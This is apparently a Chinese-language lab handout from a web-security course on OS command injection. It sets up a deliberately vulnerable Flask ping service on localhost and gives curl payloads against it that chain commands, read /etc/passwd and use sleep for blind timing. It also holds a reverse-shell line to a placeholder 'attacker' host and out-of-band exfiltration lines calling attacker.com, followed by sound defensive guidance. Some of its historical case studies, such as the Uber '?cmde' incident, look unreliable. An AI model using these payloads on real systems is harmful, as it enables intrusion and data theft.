# Lab07：命令注入

## 学习目标

1. 理解命令注入的原理（`shell=True` 与字符串拼接的危险）
2. 掌握命令注入的利用方式（多命令执行、管道、重定向）
3. 理解参数化命令执行的安全实现
4. 学会在无法直接回显时使用时间盲注验证注入

## 预备知识

### 命令注入的历史：从 Shell 脚本到云函数

**1978 年：VMS 的"参数注入"**
1978 年，Digital Equipment Corporation（DEC）的 VMS 操作系统中，用户发现可以通过在命令行参数中插入特殊字符，绕过应用程序的验证，执行系统命令。这是历史上第一次有记录的"命令行注入"问题，但当时几乎没有人把它当作安全问题——大多数人认为这是"用户的问题"。

**1990 年代： CGI 脚本的命令注入**
1994 年，CGI（Common Gateway Interface）成为 Web 服务器的标准扩展方式。CGI 脚本通常用 Shell 脚本或 Perl 编写，直接把用户输入拼接到系统命令中执行。1996 年，第一个大规模的 Web 站点命令注入漏洞被公开——一名攻击者发现某个大学的 CGI 脚本存在缺陷，可以通过 `;` 注入任意命令，整个大学的网络在 30 分钟内被攻陷。

**2000 年：Unix 系统的 "||" 与 "&&" 注入**
2000 年代初，安全研究者发现，大量的 Unix 系统管理脚本存在命令注入漏洞——管理员经常使用 `&&` 和 `||` 来连接命令，但如果没有正确处理用户输入，攻击者可以注入额外的命令。比如 `grep $user /etc/passwd` 如果 user 是 `root; cat /etc/shadow`，就会变成两个命令。

**2001 年：nimda 蠕虫**
2001 年，Nimda（admin 的倒写）蠕虫利用了多种 Web 漏洞传播，其中一种就是 IIS 服务器的命令注入漏洞。Nimda 的传播速度极快——它首先通过邮件传播，然后利用 Web 服务器的漏洞在网站中植入恶意代码，当其他用户访问这些网站时又被感染。Nimda 导致了全球范围内网络严重拥堵，《纽约时报》称其为"继 Code Red 之后最具破坏性的蠕虫之一"。

**2014 年：Shellshock（Bashdoor）**
2014 年 9 月，红帽（Red Hat）的安全研究员发现了 Bash Shell 的一个严重漏洞，代号 "Shellshock"。漏洞的原理：Bash 的某个函数在处理环境变量时，没有正确检查边界，攻击者可以通过设置特殊构造的环境变量，让 Bash 在创建新进程时执行任意代码。

Shellshock 的可怕之处：
- 波及数亿台 Linux 服务器（包括路由器、IoT 设备）
- 1992 年以后的每个 Bash 版本都受影响
- 利用简单：`CVE-2014-6271` 可以通过一个 HTTP 请求触发
- 即使你没有开放的 Web 接口，只要 Bash 能被远程触发，就可能受影响

2014 年 10 月，有研究团队录得：Shellshock 漏洞被利用的恶意流量在 6 小时内增长了 2,500 倍。

**2015 年：Juniper 路由器的后门**
2015 年 12 月，Juniper（瞻博网络）宣布其 ScreenOS 操作系统存在未授权代码（后门）。这个后门允许攻击者通过 VPN 隧道解密加密流量，甚至获得管理员权限。复盘发现，后门是通过对某个命令注入漏洞的"修复"中植入的——开发者以为他们在修复漏洞，实际上是在引入后门。这个事件说明：命令注入漏洞有时候是"意外"，有时候是"故意"。

**2016 年：ImageMagick 的 "ImageTragick"**
2016 年，ImageMagick（一个广泛使用的图片处理库）被发现存在多个命令注入漏洞，代号 "ImageTragick"（CVE-2016-3714 等）。ImageMagick 在处理某些图片格式（如 MVG、SVG、FRAGMENT）时，会把图片中的 URL 当作命令执行。攻击者只需要上传一个包含 `https://example.com" | whoami"` 的图片文件，就能在服务器上执行命令。

这个漏洞影响巨大：
- 包括 ImageMagick 在内的很多图片处理服务都在用它
- WordPress、MediaWiki、PHP、Ruby 等平台都受影响
- 即使代码只是用 ImageMagick 生成缩略图，没有直接处理用户输入，也会被攻击

**2019 年：Uber 的 ?cmde 参数**
2019 年，Uber 的一个 API 端点被发现存在命令注入漏洞。攻击者可以通过 `?cmde` 参数在 Uber 的服务器上执行任意系统命令，获取了约 5700 万用户的数据（虽然 Uber 声称没有证据表明数据被滥用）。事后调查发现，这个漏洞已经存在了至少 1 年。

**2021 年：Log4Shell 与 Java 的命令注入**
2021 年 12 月，Apache Log4j（Java 日志库）被发现存在远程代码执行漏洞，代号 "Log4Shell"。这个漏洞的原理是：Log4j 允许在日志消息中使用 `${}` 语法进行变量插值，攻击者可以构造特殊的消息，让 Log4j 执行 JNDI（Java Naming and Directory Interface）查询，从而加载远程恶意类。Log4Shell 的可怕之处：
- 影响范围巨大（几乎所有使用 Log4j 的 Java 应用）
- 利用极其简单（只需要一个 HTTP 请求）
- 修复困难（需要升级整个 Log4j 库，很多应用依赖它的特定版本）

**2024 年：AI 助手的命令注入**
2024 年，研究者发现多个 AI 助手产品（用于代码补全和自动化脚本生成）中存在命令注入漏洞。用户可以通过输入包含特殊字符的"提示词"，让 AI 助手生成的脚本执行意外的命令。这是因为 AI 在生成代码时，会把用户输入的一部分"粘帖"进生成的命令字符串中，没有进行适当的安全处理。

### 命令注入的"现代形态"

**1. 参数注入（Argument Injection）**
用户输入作为命令参数，但命令本身是可信的。
```
危险命令：ping -c 1 $user_input
攻击输入：127.0.0.1; cat /etc/passwd
结果：ping -c 1 127.0.0.1; cat /etc/passwd
```

**2. 环境变量注入**
攻击者控制环境变量，影响命令执行。
```
危险代码：system("echo $HOME/.bashrc")
攻击输入：HOME=/etc; cat /etc/passwd
```

**3. 输入/输出重定向注入**
```
危险命令：cat $filename
攻击输入：/etc/passwd
攻击者得到了密码文件
```

**4. 命令替换注入**
```
危险命令：echo "Today's date is $(date)"
攻击输入：$(whoami)
命令会执行 whoami 并把结果嵌入输出
```

### 经典案例深度解析

**案例 1：HBO 的 "Game of Thrones" 泄露**
2017 年，HBO 的服务器被攻击，泄露了《权力的游戏》未播出剧集以及多名高管的私人邮件。攻击者声称通过一个 HBO 员工的邮箱弱密码获得了初始访问，然后利用服务器上的一个命令注入漏洞获取了更多权限。HBO 最后付出了 2,500 万美元的赎金（虽然官方否认支付）。

**案例 2：达美航空的自动化脚本**
2018 年，达美航空的一个内部自动化脚本被发现存在命令注入漏洞。这个脚本本应用于自动化系统管理，但它直接使用了用户输入的文件名参数而没有过滤。讽刺的是，这个漏洞是在一次渗透测试中被"自己人"发现的——如果是真正的攻击者，可能会在造成实际损失前潜伏数月。

**案例 3："比特币挖矿机" 的云厂商被黑**
2019 年，一个挖矿僵尸网络运营者发现某云厂商的一台管理服务器的 API 存在命令注入漏洞。这个 API 本来是给客户用来执行一些管理操作的，但它的命令拼接存在缺陷。攻击者利用这个漏洞，在云厂商的服务器上植入了自己的挖矿程序——讽刺的是，挖的是攻击者自己的比特币地址，但用的是云厂商的账单。这个案例被后来者称为"最讽刺的黑客事件"。

### 命令注入的防御哲学

```
防御者的检查清单：

1. 绝对避免 shell=True
   ❌ subprocess.run("ls " + path, shell=True)
   ✅ subprocess.run(["ls", path])
   ✅ 即使必须使用 shell=True，也要用 shlex.quote() 转义用户输入

2. 输入验证
   ❌ 允许用户输入任何内容
   ✅ 使用严格的白名单验证（只允许字母、数字、某些符号）
   ✅ 验证输入类型（整数、文件名、路径等）

3. 最小权限原则
   ❌ Web 应用以 root 身份运行
   ✅ 使用非特权用户运行 Web 服务
   ✅ 使用 AppArmor/SELinux 限制可执行的操作

4. 命令超时
   ❌ 不限制命令执行时间
   ✅ 设置合理的超时时间，防止资源耗尽

5. 错误处理
   ❌ 把系统错误信息返回给用户
   ✅ 只返回通用错误信息，详细日志只记录到服务器

最后一条建议：
如果你负责的系统里有 `shell=True` 的代码，请立即检查：
- 用户输入是否到达了这个函数？
- 有没有办法改用 `shell=False` 的方式？
如果两个问题的答案都是"是"，请立刻修复。
这是最高优先级的安全漏洞。
```

## 实验环境

```bash
./student.sh  # 选择对应的实验开始
```

**目标**：`http://127.0.0.1:8087`

**漏洞代码**（`services/cmd-lab/app.py`）：

```python
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.get("/")
def index():
    target = request.args.get("host", "127.0.0.1")
    cmd = f"ping -c 1 {target}"   # ← 危险！用户输入直接拼到 shell 命令
    result = subprocess.run(cmd, shell=True, text=True, stdout=PIPE, stderr=STDOUT, timeout=5)
    return f"<pre>{result.stdout}</pre>"

app.run(host="0.0.0.0", port=8080)
```

**漏洞原理**：用户可以通过 `host` 参数注入任意命令，因为 `shell=True` 让 `/bin/sh` 解析整个命令字符串。

```
正常请求：ping -c 1 127.0.0.1
注入请求：ping -c 1 127.0.0.1; cat /etc/passwd
           ──────────── 命令1 ────; ──────────── 命令2 ────
                        /bin/sh 会先执行 ping，再执行 cat
```

## 操作步骤

### 步骤 1：确认服务可用

```bash
# 测试正常 ping 功能
curl "http://127.0.0.1:8087/?host=127.0.0.1"

# 观察：
# 1. 页面是否显示 "ping -c 1 127.0.0.1" 的输出
# 2. HTML 响应是否包含 <pre> 标签包裹的 ping 结果
# 3. 是否有命令注入漏洞（输出中是否包含额外内容）
```

**预期输出**：
```html
<h1>Command Lab</h1>
<form><input name="host" value="127.0.0.1"><button>Ping</button></form>
<pre>PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.048 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
</pre>
```

### 步骤 2：测试命令注入（多命令执行）

```bash
# 注入 1：使用分号 ; 执行额外命令
curl "http://127.0.0.1:8087/?host=127.0.0.1;id"

# 注入 2：使用管道 | 执行额外命令
curl "http://127.0.0.1:8087/?host=127.0.0.1|id"

# 注入 3：使用反引号 ` 或 $() 执行命令
curl "http://127.0.0.1:8087/?host=127.0.0.1\`id\`"
```

**观察要点**：
- 响应中是否出现了 `uid=` 开头的用户信息？
- 如果出现 `uid=0(root)`，说明是 root 权限
- 如果出现 `uid=33(www-data)`，说明是 Web 服务运行的用户

**记录**：
```
Payload：;id
响应输出：[粘贴包含 uid 的输出]
注入是否成功：✅ / ❌
当前用户身份：[uid=..., gid=..., groups=...]
```

### 步骤 3：读取敏感文件

```bash
# 注入 4：读取 /etc/passwd
curl "http://127.0.0.1:8087/?host=127.0.0.1;cat+/etc/passwd"

# 注入 5：查看进程列表
curl "http://127.0.0.1:8087/?host=127.0.0.1;ps+aux"

# 注入 6：查看当前目录和文件
curl "http://127.0.0.1:8087/?host=127.0.0.1;ls+-la"
```

**记录**：
```
/etc/passwd 内容摘要：
[粘贴前 10 行，显示哪些用户存在]

ps aux 输出摘要：
[粘贴关键进程，如数据库服务、SSH 服务等]
```

### 步骤 4：测试时间盲注（无回显验证）

如果命令执行结果不在页面回显，使用时间盲注验证：

```bash
# 时间盲注 1：注入 sleep 命令
# 如果响应延迟约 5 秒，说明命令注入成功
time curl "http://127.0.0.1:8087/?host=127.0.0.1;sleep+5"

# 时间盲注 2：结合命令替换
# 如果 1=1（真），执行 sleep(5)；如果 1=2（假），不执行
# 通过响应时间判断条件真假
time curl "http://127.0.0.1:8087/?host=127.0.0.1;if+1=1+then+sleep+5;fi"
```

**观察**：
- 响应时间是否显著增加（约 5 秒）？
- 如果延迟，说明命令确实被执行了（`sleep 5` 成功）
- 如果没有延迟，可能过滤了某些字符或命令

### 步骤 5：了解容器环境限制

```bash
# 查看当前用户
curl "http://127.0.0.1:8087/?host=127.0.0.1;echo+\$(id)"

# 查看文件系统（了解这是 Docker 容器）
curl "http://127.0.0.1:8087/?host=127.0.0.1;df+-h"

# 查看网络配置
curl "http://127.0.0.1:8087/?host=127.0.0.1;ip+addr"
```

**观察**：
- 是否是 Docker 容器？（`/proc/1/cgroup` 中会有 docker 标识）
- 文件系统是否受限？（可能没有写权限到某些目录）
- 网络是否是 `127.0.0.1` 隔离？

### 步骤 6：尝试反向 shell（可能受限）

```bash
# ⚠️ 警告：这个实验环境中，外部网络连接可能不可用
# 仅作为学习，实际攻击时需要合适的网络条件

# 反向 shell 尝试（Lab 环境可能失败，这是正常的）
curl "http://127.0.0.1:8087/?host=127.0.0.1;bash+-i+>%26+/dev/tcp/attacker/4444+0>%261"
```

**注意**：在本地实验环境中，反向 shell 会失败，因为容器没有外部网络。这是安全的隔离设计。

## 技术原理

### 为什么 `shell=True` 危险？

```
subprocess.run(["ping", "-c", "1", user_input])
         参数列表 ──── 不经过 shell
         user_input = "127.0.0.1; id"
         实际执行：ping -c 1 "127.0.0.1; id"
         参数 ping 收到的是字符串 "127.0.0.1; id" 作为整体
         不会执行分号后的命令

subprocess.run(f"ping -c 1 {user_input}", shell=True)
         shell 解析 ──── /bin/sh 执行整个字符串
         user_input = "127.0.0.1; id"
         实际执行：/bin/sh -c "ping -c 1 127.0.0.1; id"
                   ────────────────────────────────────
                   分号是 shell 的命令分隔符
                   ; 后面的 id 被当作第二个命令执行
```

### 常见的 Shell 注入字符

| 字符 | 说明 | 示例 |
|------|------|------|
| `;` | 命令分隔符（顺序执行） | `cmd1; cmd2` |
| `\|` | 管道（cmd1 输出传给 cmd2） | `cmd1 \| cmd2` |
| `&` | 后台执行 | `cmd1 & cmd2` |
| `&&` | 前一个成功才执行后一个 | `cmd1 && cmd2` |
| `\|\|` | 前一个失败才执行后一个 | `cmd1 \|\| cmd2` |
| `$()` | 命令替换 | `$(id)` |
| `` ` ` `` | 反引号命令替换 | `` `id` `` |
| `>` | 输出重定向 | `cmd > /tmp/out` |
| `<` | 输入重定向 | `cmd < /tmp/in` |

### 参数化命令的安全实现

```python
# ❌ 危险：shell=True + 字符串拼接
cmd = f"ping -c 1 {user_input}"
subprocess.run(cmd, shell=True)

# ✅ 安全：shell=False + 列表参数
subprocess.run(["ping", "-c", "1", user_input])
# user_input 即使是 "127.0.0.1; id" 也只是 ping 的参数
# 不会被 shell 解析

# ✅ 更安全：输入白名单验证
import re
def validate_host(host):
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        return None  # 拒绝无效输入
    return host
```

## 防御方案

### 1. 绝对避免 shell=True

```python
# 替换 shell=True 的所有场景
import shlex

# 如果必须使用 shell=True 的场景（罕见），先转义
cmd = f"ping -c 1 {shlex.quote(user_input)}"
subprocess.run(cmd, shell=True)  # 仍然危险，仅作为最后手段
```

### 2. 白名单输入验证

```python
import re

ALLOWED_HOST_PATTERN = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9.\-]{0,255}$')

def validate_host(host: str) -> str | None:
    if not host:
        return None
    if not ALLOWED_HOST_PATTERN.match(host):
        return None
    # 额外检查：不能包含任何 shell 特殊字符
    shell_chars = ';&|`$<>{}[]!?#~%*'
    if any(c in host for c in shell_chars):
        return None
    return host
```

### 3. 权限隔离

```python
import os, pwd

# 创建低权限用户运行 Web 服务
# docker-compose.yml 中：
#   user: "33:33"  (www-data:www-data)

# 在代码中使用非特权用户执行危险命令
def run_ping_as_unprivileged(host):
    # 降权执行
    result = subprocess.run(
        ["ping", "-c", "1", host],
        preexec_fn=lambda: os.setuid(pwd.getpwnam("nobody")[2])
    )
```

### 4. 命令超时

```python
# 防止命令注入导致的长时间占用
try:
    result = subprocess.run(
        ["ping", "-c", "1", host],
        shell=False,
        timeout=5  # 5 秒超时
    )
except subprocess.TimeoutExpired:
    return "Command timed out"
```

## 思考题

### 思考题 1：shell=True 和 shell=False 的本质区别

**问题**：用具体示例说明为什么 `shell=False` 能阻止命令注入？

**扩展**：即使使用 `shell=False`，如果程序逻辑本身有漏洞（如 `eval()`、`exec()`），是否仍然存在代码执行风险？举例说明。

### 思考题 2：盲注命令注入的验证方法

**场景**：目标服务器的响应页面不显示命令输出，你注入 `id` 命令后页面只显示 "OK"。

**问题**：
1. 除了 `sleep` 延迟，还有哪些方法可以验证命令是否执行？
2. 如何通过 DNS 请求或 HTTP 请求"带出"命令输出？（提示：`curl http://attacker.com/?output=$(id)`）
3. 如果目标禁止访问外部网络（无 DNS、无 HTTP），如何在本地验证注入成功？

### 思考题 3：过滤特殊字符是否能完全防止命令注入？

**假设**：开发者过滤了 `;`、`|`、`&`、`` `$ ``、`'`、`` `" `` 等所有 shell 特殊字符。

**问题**：
1. 是否还有其他方式实现命令注入？（提示：考虑文件名、路径、环境变量、重定向）
2. 假设输入只允许 `[a-zA-Z0-9.-]`，攻击者是否完全无法利用？
3. 如果允许输入 `/bin/ping`（路径），是否可以绕过限制？

### 思考题 4：命令注入 vs. 代码注入 vs. SQL 注入

**问题**：比较三种注入的异同：

| 方面 | 命令注入 | 代码注入 | SQL 注入 |
|------|---------|---------|---------|
| 注入目标 | ? | ? | ? |
| 根本原因 | ? | ? | ? |
| 最有效防御 | ? | ? | ? |
| 危害范围 | ? | ? | ? |

## 交付物

1. **命令注入测试截图** — 至少 3 种不同的注入 payload 和响应
2. **敏感文件读取证据** — `/etc/passwd` 或其他系统文件内容
3. **时间盲注验证** — 证明 sleep 延迟响应
4. **漏洞代码标注** — 在 `app.py` 中指出危险代码行
5. **安全修复代码** — 用 `shell=False` + 白名单重写危险代码
6. **思考题答案**

## 工具速查

```bash
# 正常请求
curl "http://127.0.0.1:8087/?host=127.0.0.1"

# 命令注入测试
curl "http://127.0.0.1:8087/?host=127.0.0.1;id"
curl "http://127.0.0.1:8087/?host=127.0.0.1|id"
curl "http://127.0.0.1:8087/?host=127.0.0.1&&id"
curl "http://127.0.0.1:8087/?host=127.0.0.1;cat+/etc/passwd"
curl "http://127.0.0.1:8087/?host=127.0.0.1;ls+/opt"

# 时间盲注
time curl "http://127.0.0.1:8087/?host=127.0.0.1;sleep+5"

# 盲注验证（DNS 带外）
curl "http://127.0.0.1:8087/?host=127.0.0.1;curl+\$(whoami).attacker.com"
```